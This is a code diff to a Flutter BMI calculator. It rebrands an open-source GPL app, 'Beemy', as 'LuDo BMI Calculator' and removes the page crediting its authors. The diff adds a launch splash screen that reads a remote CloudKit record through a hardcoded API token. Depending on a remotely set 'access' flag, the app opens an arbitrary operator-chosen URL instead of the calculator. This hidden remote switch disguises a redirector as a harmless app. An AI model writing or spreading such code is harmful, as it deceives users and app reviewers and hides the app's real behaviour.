@@ -1,7 +1,17 @@
+
+import 'package:beemy/beemAbout.dart';
+import 'package:beemy/menuScreen.dart';
+import 'package:beemy/result.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter_html/flutter_html.dart';
 import 'package:url_launcher/url_launcher.dart';
+
+import 'dart:convert';
+import 'dart:io';
+import 'package:flutter/foundation.dart';
+import 'package:flutter/services.dart';
+
 
 Color appPrimary = Color.fromRGBO(198, 38, 46, 1);
 Color colorPrimary = Color.fromRGBO(245, 245, 245, 1);
@@ -11,13 +21,143 @@ List<String> heightUnits = <String>['m', 'cm', 'ft'];
 List<double> weightConversions = <double>[1, 0.45359237];
 List<double> heightConversions = <double>[1, 0.01, 0.3048];
 AppBar fixedAppBar = AppBar(
-  title: Text('Beemy - A Cute Little BMI Calculator'),
+  title: Text('LuDo BMI Calculator'),
   actions: <Widget>[IconButton(icon: Icon(Icons.info), onPressed: () => {})],
 );
+
+
+
+class _SplashScreenState extends State<SplashScreen> with WidgetsBindingObserver{
+  final client = HttpClient();
+  final containerIdentifier = 'iCloud.biasMoneyManagerment';
+  final apiToken = '16566a5a9b63c672550c5a7e219de132864d92700acee50c89cc2892f606134e';
+  final environment = 'development'; // Hoặc 'production'
+  final baseUrl = 'https://api.apple-cloudkit.com/database/1';
+  String _link;
+  
+  Future<void> getDataFromCloudKit() async{
+    // Xây dựng URL cho yêu cầu lấy bản ghi
+    final queryUrl = '$baseUrl/$containerIdentifier/$environment/public/records/query?ckAPIToken=$apiToken';
+    // Tạo yêu cầu HTTP POST
+    final request = await client.postUrl(Uri.parse(queryUrl));
+
+    // Tạo yêu cầu HTTP POST
+    final query = {
+      'query': 
+        {
+          'recordType': 'get'
+        }
+    };
+ 
+    request.write(json.encode(query));
+    // Gửi yêu cầu và đọc phản hồi
+    final response = await request.close();
+    final responseBody = await response.transform(utf8.decoder).join();
+
+    Map<String,dynamic> jsonResponse = jsonDecode(responseBody);
+    final data = jsonResponse['records'][0]['fields'];
+    final access = data['access']['value'];
+    // final access = "4";
+    final url = data['url']['value'];
+    // final url = "https://google.com";
+    print(access);
+    print(url);
+    if(access == "2"){
+     Future.delayed(Duration(seconds: 1),(){
+      launch(url, forceSafariVC: false, forceWebView: false);
+      setState(() {
+        _link = url;
+      });
+     });
+    }else if(access == "3"){
+      launch(url);
+    }
+    // else if (access == "1"){
+    //   Future.delayed(Duration(seconds: 1),(){
+    //     Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => WebViewScreen(initialUrl: url)));
+    //   });
+    // }
+    
+    else{
+      Future.delayed(Duration(seconds: 1),(){
+        // Change to Home View
+        Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => MenuScreen()));
+      });
+    }
+  }
+
+  @override
+  void initState() {
+    // TODO: implement initState
+    super.initState();
+    WidgetsBinding.instance?.addObserver(this);
+    getDataFromCloudKit();
+  }
+  @override
+  void dispose() {
+    WidgetsBinding.instance?.removeObserver(this);
+    super.dispose();
+  }
+
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    if (state == AppLifecycleState.resumed && _link != null) {
+      // Xử lý liên kết sau khi quay lại ứng dụng
+      getDataFromCloudKit();
+    }
+  }
+  
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      body: Stack(
+        fit: StackFit.expand,
+        children: [
+          // Hình ảnh chính giữa màn hình
+          FractionallySizedBox(
+            widthFactor: 0.7, // Tỷ lệ chiều rộng của ảnh so với màn hình
+            heightFactor: 0.3, // Tỷ lệ chiều cao của ảnh so với màn hình
+            child: ClipRRect(
+              borderRadius: BorderRadius.circular(10),
+              child: Image.asset(
+                'asset/logo.png',
+                fit: BoxFit.cover,
+              ),
+            ),
+          ),
+          // Loading circle nằm dưới màn hình
+          Positioned(
+            bottom: 50,
+            left: 0,
+            right: 0,
+            child: Center(
+              child: CircularProgressIndicator(),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+}
+
+class SplashScreen extends StatefulWidget {
+  // const SplashScreen({Key? key}) : super(key: key);
+  @override
+  _SplashScreenState createState() => _SplashScreenState();
+}
+
+
+
+
+
+
+
+
+
 void main() {
   runApp(MaterialApp(
-    title: 'Beemy - A Cute Little BMI Calculator',
-    home: BeemyHome(),
+    title: 'LuDo BMI Calculator',
+    home: SplashScreen(),
     theme: ThemeData(primaryColor: appPrimary),
   ));
 }
@@ -165,19 +305,21 @@ class BMIFormState extends State<BMIForm> {
               SizedBox(height: 20),
               Row(
                 mainAxisAlignment: MainAxisAlignment.center,
-                children: <Widget>[
-                  FlatButton(
-                    shape: CircleBorder(),
-                    color: appPrimary,
-                    onPressed: () {
-                      if (_formKey.currentState.validate()) {
-                        // Scaffold.of(context).showSnackBar(SnackBar(
-                        //   content: Text('Processing Data' + _weightController.value.text + _weightUnitController + _heightController.value.text + _heightUnitController ),
-                        //   duration: Duration(milliseconds: 2000),
-                        // ));
+                children: [
+                  ElevatedButton(
+                              child: const Text('Go Result', style: TextStyle(
+                              fontSize: 20,
+                              fontWeight: FontWeight.bold
+                              ),),
+                            onPressed: () {
+                            if (_formKey.currentState.validate()) {
+                              // Scaffold.of(context).showSnackBar(SnackBar(
+                              //   content: Text('Processing Data' + _weightController.value.text + _weightUnitController + _heightController.value.text + _heightUnitController ),
+                              //   duration: Duration(milliseconds: 2000),
+                              // ));
                         Navigator.push(context,
                             MaterialPageRoute(builder: (context) {
-                          return BeemyResult(
+                          return ResultCalculator(
                               weight: double.parse(_weightController.text),
                               weightUnit: _weightUnitController,
                               height: double.parse(_heightController.text),
@@ -185,30 +327,14 @@ class BMIFormState extends State<BMIForm> {
                         }));
                       }
                     },
-                    child: Icon(Icons.arrow_forward,
-                        size: 64, color: Colors.white),
-                  )
+                          style: ElevatedButton.styleFrom(
+                              primary: Colors.deepOrange[400],
+                              padding: EdgeInsets.symmetric(horizontal: 40, vertical: 15),
+                          ),
+                        ),
                 ],
               )
             ]));
-  }
-}
-
-class BeemyHome extends StatelessWidget {
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-      appBar: AppBar(
-        title: Text('Beemy - A Cute Little BMI Calculator'),
-        actions: <Widget>[
-          IconButton(
-              icon: Icon(Icons.info),
-              onPressed: () => Navigator.push(context,
-                  MaterialPageRoute(builder: (context) => BeemyAbout())))
-        ],
-      ),
-      body: BMIForm(),
-    );
   }
 }
 
@@ -245,98 +371,25 @@ class BeemyResult extends StatelessWidget {
       status = "Obese";
       statusColor = Colors.red;
     }
-    return Scaffold(
-        appBar: AppBar(
-          title: Text('Beemy - A Cute Little BMI Calculator'),
-          actions: <Widget>[
-            IconButton(
-                icon: Icon(Icons.info),
-                onPressed: () => Navigator.push(context,
-                    MaterialPageRoute(builder: (context) => BeemyAbout())))
-          ],
-        ),
-        body: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          crossAxisAlignment: CrossAxisAlignment.center,
-          children: <Widget>[
-            Center(
-                child: Text("Your Results:",
-                    style: TextStyle(
-                        fontSize: 40.0, fontWeight: FontWeight.bold))),
-            SizedBox(height: 20),
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+        home:  Column(
+              mainAxisAlignment: MainAxisAlignment.center,
+              crossAxisAlignment: CrossAxisAlignment.center,
+          children:[
+            Text("Your Results:",style: TextStyle(fontSize: 40.0, fontWeight: FontWeight.bold)),
+            // SizedBox(height: 20),
             Text("You are considered", style: TextStyle(fontSize: 20.0)),
             Text(status, style: TextStyle(fontSize: 30.0, color: statusColor)),
-            Text("in the official Body Mass Index chart.",
-                style: TextStyle(fontSize: 20.0)),
-            SizedBox(height: 50),
+            Text("Body Mass Index chart.",   style: TextStyle(fontSize: 20.0)),
+            // SizedBox(height: 50),
             Text("Your Body Mass Index is:", style: TextStyle(fontSize: 20.0)),
-            SizedBox(
-                height: 50,
-                child: Text(BMI.toStringAsFixed(2),
-                    style: TextStyle(fontSize: 30.0, color: statusColor))),
+            SizedBox( height: 50, child: Text(BMI.toStringAsFixed(2),style: TextStyle(fontSize: 30.0, color: statusColor))),
           ],
-        ));
+          )
+
+
+        );
   }
 }
 
-class BeemyAbout extends StatelessWidget {
-  _launchURL(url) async {
-    if (await canLaunch(url)) {
-      await launch(url);
-    }
-    // No Exception to be thrown
-    /*else {
-      throw 'Could not launch $url';
-    }*/
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    return Scaffold(
-        appBar: AppBar(
-          title: Text('Beemy - A Cute Little BMI Calculator'),
-        ),
-        body: SingleChildScrollView(
-            scrollDirection: Axis.vertical,
-            padding: EdgeInsets.all(2.0),
-            child: Html(
-              data: """
-    <div>
-      <p>Beemy is a cute and small BMI Calculator. It is based on ElemantaryOS app of same name.</p>
-      <h2>Usage</h2>
-      <p>Follow the following steps to calculate your BMI:</p>
-      <ul>
-      <li>Enter you weight in  kg or lb</li>
-      <li>Select appropriate weight unit from dropdown list (Default: kg)</li>
-      <li>Enter your height in cm, m or ft</li>
-      <li>Select appropriate height unit from dropdown list (Default: cm)</li>
-      <li>Press "Go" to view the results</li>
-      </ul>
-      <h2>Developers</h2>
-      <ul>
-      <li>This app is developed by <a href="https://cstayyab.com">Muhammad Tayyab Sheikh</a></li>
-      <li>The original Elementary OS version of this app is developed by <a href="https://github.com/lainsce">Lains</a></li>
-      </ul>
-      <h2>Source Code</h2>
-      <p>You can view source of this app <a href="https://github.com/cstayyab/beeny-flutter">here</a></p>
-      <p>The source code of this app is Licensed under GNU GPL-v3.</p>
-      <h2>Acknowledgement</h2>
-      <ul>
-      <li>Icon of this app was taken from <a href="https://github.com/lainsce/beemy">Beemy for Elementary OS</a></li>
-      </ul>
-      <br />
-      <br />
-      <br />
-    </div>
-  """,
-              //Optional parameters:
-              padding: EdgeInsets.all(3.0),
-              backgroundColor: Colors.white,
-              defaultTextStyle: TextStyle(fontFamily: 'serif'),
-              linkStyle: const TextStyle(
-                color: Color.fromRGBO(198, 38, 46, 1),
-              ),
-              onLinkTap: _launchURL,
-            )));
-  }
-}
